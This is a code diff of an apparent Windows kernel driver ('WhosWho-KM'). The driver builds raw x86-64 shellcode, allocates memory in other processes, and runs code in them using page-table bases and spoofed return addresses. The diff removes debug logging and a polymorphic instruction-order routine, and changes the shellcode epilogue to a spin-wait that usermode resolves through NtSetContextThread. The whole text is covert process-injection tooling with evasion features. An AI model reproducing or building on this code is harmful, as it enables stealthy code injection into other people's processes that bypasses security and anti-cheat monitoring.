@@ -5,11 +5,6 @@
 #include <stddef.h>
 #include <intrin.h>
 
-#ifndef WW_LOG
-#define WW_LOG(fmt, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[WhosWho-KM] " fmt "\n", __VA_ARGS__)
-#define WW_LOG0(msg) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, "[WhosWho-KM] %s\n", msg)
-#endif
-
 #pragma intrinsic(_mm_mfence)
 
 namespace call_guard {
@@ -104,15 +99,8 @@ namespace shellcode_builder {
 
         buf[i++] = 0x9C;
 
-        ULONG push_order = poly_engine::poly_rand();
-        if (push_order & 1) {
-            buf[i++] = 0x50;
-            buf[i++] = 0x51;
-        } else {
-            buf[i++] = 0x51;
-            buf[i++] = 0x50;
-            buf[i++] = 0x48; buf[i++] = 0x87; buf[i++] = 0xC1;
-        }
+        buf[i++] = 0x50;
+        buf[i++] = 0x51;
         buf[i++] = 0x52;
         buf[i++] = 0x53;
         buf[i++] = 0x55;
@@ -132,6 +120,9 @@ namespace shellcode_builder {
         i += 8;
 
         buf[i++] = 0x48; buf[i++] = 0x89; buf[i++] = 0x5E; buf[i++] = 0x48;
+
+        // mov [rsi+0x100], rsp -- save exact post-GPR-push RSP to reserved[0]
+        buf[i++] = 0x48; buf[i++] = 0x89; buf[i++] = 0xA6; buf[i++] = 0x00; buf[i++] = 0x01; buf[i++] = 0x00; buf[i++] = 0x00;
 
         buf[i++] = 0x48; buf[i++] = 0x83; buf[i++] = 0xE4; buf[i++] = 0xF0;
 
@@ -168,40 +159,11 @@ namespace shellcode_builder {
 
         buf[i++] = 0x0F; buf[i++] = 0xAE; buf[i++] = 0xF0;
 
-        buf[i++] = 0x48; buf[i++] = 0x8B; buf[i++] = 0x66; buf[i++] = 0x38;
-
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x6C; buf[i++] = 0x24; buf[i++] = 0x50;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x64; buf[i++] = 0x24; buf[i++] = 0x40;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x5C; buf[i++] = 0x24; buf[i++] = 0x30;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x54; buf[i++] = 0x24; buf[i++] = 0x20;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x4C; buf[i++] = 0x24; buf[i++] = 0x10;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x04; buf[i++] = 0x24;
-        buf[i++] = 0x48; buf[i++] = 0x81; buf[i++] = 0xC4; buf[i++] = 0x80; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
-
-        buf[i++] = 0x41; buf[i++] = 0x5F;
-        buf[i++] = 0x41; buf[i++] = 0x5E;
-        buf[i++] = 0x41; buf[i++] = 0x5D;
-        buf[i++] = 0x41; buf[i++] = 0x5C;
-        buf[i++] = 0x41; buf[i++] = 0x5B;
-        buf[i++] = 0x41; buf[i++] = 0x5A;
-        buf[i++] = 0x41; buf[i++] = 0x59;
-        buf[i++] = 0x41; buf[i++] = 0x58;
-        buf[i++] = 0x5F;
-        buf[i++] = 0x5E;
-        buf[i++] = 0x5D;
-        buf[i++] = 0x5B;
-        buf[i++] = 0x5A;
-        buf[i++] = 0x59;
-        buf[i++] = 0x58;
-
-        buf[i++] = 0x9D;
-
-        buf[i++] = 0x48; buf[i++] = 0xBE;
-        *(UINT64*)&buf[i] = ctx_addr;
-        i += 8;
-        buf[i++] = 0x48; buf[i++] = 0x8B; buf[i++] = 0x66; buf[i++] = 0x60;
-        buf[i++] = 0x48; buf[i++] = 0x8B; buf[i++] = 0x46; buf[i++] = 0x40;
-        buf[i++] = 0xFF; buf[i++] = 0xE0;
+        // Spin-wait: usermode will suspend this thread and restore original context via NtSetContextThread
+        // pause
+        buf[i++] = 0xF3; buf[i++] = 0x90;
+        // jmp -4 (back to pause)
+        buf[i++] = 0xEB; buf[i++] = 0xFC;
 
         return i;
     }
@@ -240,6 +202,9 @@ namespace shellcode_builder {
         i += 8;
 
         buf[i++] = 0x48; buf[i++] = 0x89; buf[i++] = 0x5E; buf[i++] = 0x48;
+
+        // mov [rsi+0x100], rsp -- save exact post-GPR-push RSP to reserved[0]
+        buf[i++] = 0x48; buf[i++] = 0x89; buf[i++] = 0xA6; buf[i++] = 0x00; buf[i++] = 0x01; buf[i++] = 0x00; buf[i++] = 0x00;
 
         buf[i++] = 0x48; buf[i++] = 0x83; buf[i++] = 0xE4; buf[i++] = 0xF0;
 
@@ -300,40 +265,11 @@ namespace shellcode_builder {
 
         buf[i++] = 0x0F; buf[i++] = 0xAE; buf[i++] = 0xF0;
 
-        buf[i++] = 0x48; buf[i++] = 0x8B; buf[i++] = 0x66; buf[i++] = 0x38;
-
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x6C; buf[i++] = 0x24; buf[i++] = 0x50;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x64; buf[i++] = 0x24; buf[i++] = 0x40;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x5C; buf[i++] = 0x24; buf[i++] = 0x30;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x54; buf[i++] = 0x24; buf[i++] = 0x20;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x4C; buf[i++] = 0x24; buf[i++] = 0x10;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x04; buf[i++] = 0x24;
-        buf[i++] = 0x48; buf[i++] = 0x81; buf[i++] = 0xC4; buf[i++] = 0x80; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
-
-        buf[i++] = 0x41; buf[i++] = 0x5F;
-        buf[i++] = 0x41; buf[i++] = 0x5E;
-        buf[i++] = 0x41; buf[i++] = 0x5D;
-        buf[i++] = 0x41; buf[i++] = 0x5C;
-        buf[i++] = 0x41; buf[i++] = 0x5B;
-        buf[i++] = 0x41; buf[i++] = 0x5A;
-        buf[i++] = 0x41; buf[i++] = 0x59;
-        buf[i++] = 0x41; buf[i++] = 0x58;
-        buf[i++] = 0x5F;
-        buf[i++] = 0x5E;
-        buf[i++] = 0x5D;
-        buf[i++] = 0x5B;
-        buf[i++] = 0x5A;
-        buf[i++] = 0x59;
-        buf[i++] = 0x58;
-
-        buf[i++] = 0x9D;
-
-        buf[i++] = 0x48; buf[i++] = 0xBE;
-        *(UINT64*)&buf[i] = ctx_addr;
-        i += 8;
-        buf[i++] = 0x48; buf[i++] = 0x8B; buf[i++] = 0x66; buf[i++] = 0x60;
-        buf[i++] = 0x48; buf[i++] = 0x8B; buf[i++] = 0x46; buf[i++] = 0x40;
-        buf[i++] = 0xFF; buf[i++] = 0xE0;
+        // Spin-wait: usermode will suspend this thread and restore original context via NtSetContextThread
+        // pause
+        buf[i++] = 0xF3; buf[i++] = 0x90;
+        // jmp -4 (back to pause)
+        buf[i++] = 0xEB; buf[i++] = 0xFC;
 
         return i;
     }
@@ -374,6 +310,9 @@ namespace shellcode_builder {
 
         buf[i++] = 0x48; buf[i++] = 0x89; buf[i++] = 0x5E; buf[i++] = 0x48;
 
+        // mov [rsi+0x100], rsp -- save exact post-GPR-push RSP to reserved[0]
+        buf[i++] = 0x48; buf[i++] = 0x89; buf[i++] = 0xA6; buf[i++] = 0x00; buf[i++] = 0x01; buf[i++] = 0x00; buf[i++] = 0x00;
+
         buf[i++] = 0x48; buf[i++] = 0x83; buf[i++] = 0xE4; buf[i++] = 0xF0;
 
         buf[i++] = 0x48; buf[i++] = 0x81; buf[i++] = 0xEC; buf[i++] = 0x80; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
@@ -409,40 +348,11 @@ namespace shellcode_builder {
 
         buf[i++] = 0x0F; buf[i++] = 0xAE; buf[i++] = 0xF0;
 
-        buf[i++] = 0x48; buf[i++] = 0x8B; buf[i++] = 0x66; buf[i++] = 0x38;
-
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x6C; buf[i++] = 0x24; buf[i++] = 0x50;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x64; buf[i++] = 0x24; buf[i++] = 0x40;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x5C; buf[i++] = 0x24; buf[i++] = 0x30;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x54; buf[i++] = 0x24; buf[i++] = 0x20;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x4C; buf[i++] = 0x24; buf[i++] = 0x10;
-        buf[i++] = 0x0F; buf[i++] = 0x28; buf[i++] = 0x04; buf[i++] = 0x24;
-        buf[i++] = 0x48; buf[i++] = 0x81; buf[i++] = 0xC4; buf[i++] = 0x80; buf[i++] = 0x00; buf[i++] = 0x00; buf[i++] = 0x00;
-
-        buf[i++] = 0x41; buf[i++] = 0x5F;
-        buf[i++] = 0x41; buf[i++] = 0x5E;
-        buf[i++] = 0x41; buf[i++] = 0x5D;
-        buf[i++] = 0x41; buf[i++] = 0x5C;
-        buf[i++] = 0x41; buf[i++] = 0x5B;
-        buf[i++] = 0x41; buf[i++] = 0x5A;
-        buf[i++] = 0x41; buf[i++] = 0x59;
-        buf[i++] = 0x41; buf[i++] = 0x58;
-        buf[i++] = 0x5F;
-        buf[i++] = 0x5E;
-        buf[i++] = 0x5D;
-        buf[i++] = 0x5B;
-        buf[i++] = 0x5A;
-        buf[i++] = 0x59;
-        buf[i++] = 0x58;
-
-        buf[i++] = 0x9D;
-
-        buf[i++] = 0x48; buf[i++] = 0xBE;
-        *(UINT64*)&buf[i] = ctx_addr;
-        i += 8;
-        buf[i++] = 0x48; buf[i++] = 0x8B; buf[i++] = 0x66; buf[i++] = 0x60;
-        buf[i++] = 0x48; buf[i++] = 0x8B; buf[i++] = 0x46; buf[i++] = 0x40;
-        buf[i++] = 0xFF; buf[i++] = 0xE0;
+        // Spin-wait: usermode will suspend this thread and restore original context via NtSetContextThread
+        // pause
+        buf[i++] = 0xF3; buf[i++] = 0x90;
+        // jmp -4 (back to pause)
+        buf[i++] = 0xEB; buf[i++] = 0xFC;
 
         return i;
     }
@@ -450,13 +360,8 @@ namespace shellcode_builder {
 
 NTSTATUS functions::handle7781(p_remote_call request) {
     if (!request) {
-        WW_LOG0("handle7781: null request");
         return STATUS_INVALID_PARAMETER;
     }
-
-    WW_LOG("handle7781: target=0x%llX dtb=0x%llX shellcode=0x%llX spoof=0x%llX",
-        request->target_function, request->dtb, request->shellcode_address, request->spoof_return);
-
 
     if (!call_guard::is_valid_code_ptr(request->target_function)) {
         return STATUS_INVALID_ADDRESS;
@@ -600,19 +505,14 @@ NTSTATUS functions::handle7781(p_remote_call request) {
     request->result = 0;
     request->completed = 0;
 
-    WW_LOG("handle7781: SUCCESS shellcode at 0x%llX, sc_size=%llu ep_size=%llu",
-        code_addr, (UINT64)sc_size, (UINT64)ep_size);
 
     return STATUS_SUCCESS;
 }
 
 NTSTATUS functions::handle7782(p_call_result request) {
     if (!request) {
-        WW_LOG0("handle7782: null request");
         return STATUS_INVALID_PARAMETER;
     }
-
-    WW_LOG("handle7782: dtb=0x%llX result_addr=0x%llX", request->dtb, request->result_address);
 
     if (!call_guard::is_valid_dtb(request->dtb)) {
         return STATUS_INVALID_PARAMETER;
@@ -658,9 +558,7 @@ NTSTATUS functions::handle7782(p_call_result request) {
     if (done_flag != 0) {
         request->result = ctx.ret_value;
         request->completed = 1;
-        WW_LOG("handle7782: DONE result=0x%llX", ctx.ret_value);
     } else {
-        WW_LOG0("handle7782: not yet completed");
     }
 
     return STATUS_SUCCESS;
@@ -668,11 +566,8 @@ NTSTATUS functions::handle7782(p_call_result request) {
 
 NTSTATUS functions::handle7782_legacy(p_call_result request) {
     if (!request) {
-        WW_LOG0("handle7782_legacy: null request");
         return STATUS_INVALID_PARAMETER;
     }
-    WW_LOG("handle7782_legacy: dtb=0x%llX result_addr=0x%llX", request->dtb, request->result_address);
-
     if (!call_guard::is_valid_dtb(request->dtb)) {
         return STATUS_INVALID_PARAMETER;
     }
@@ -727,11 +622,8 @@ namespace alloc_internal {
 
 NTSTATUS functions::handle7783(p_alloc_mem request) {
     if (!request) {
-        WW_LOG0("handle7783: null request");
         return STATUS_INVALID_PARAMETER;
     }
-
-    WW_LOG("handle7783: pid=%u size=0x%llX", request->pid, (UINT64)request->size);
 
     if (request->pid == 0 || request->pid <= 4) {
         return STATUS_INVALID_PARAMETER;
@@ -789,10 +681,7 @@ NTSTATUS functions::handle7783(p_alloc_mem request) {
     if (NT_SUCCESS(status) && base_addr) {
         request->allocated_address = (UINT64)base_addr;
         request->actual_size = region_size;
-        WW_LOG("handle7783: SUCCESS addr=0x%llX actual=0x%llX",
-            (UINT64)base_addr, (UINT64)region_size);
     } else {
-        WW_LOG("handle7783: FAILED status=0x%08X", status);
         request->allocated_address = 0;
         request->actual_size = 0;
     }
@@ -802,11 +691,8 @@ NTSTATUS functions::handle7783(p_alloc_mem request) {
 
 NTSTATUS functions::handle7784(p_free_mem request) {
     if (!request) {
-        WW_LOG0("handle7784: null request");
         return STATUS_INVALID_PARAMETER;
     }
-
-    WW_LOG("handle7784: pid=%u addr=0x%llX", request->pid, request->address);
 
     if (request->pid == 0 || request->pid <= 4) {
         return STATUS_INVALID_PARAMETER;
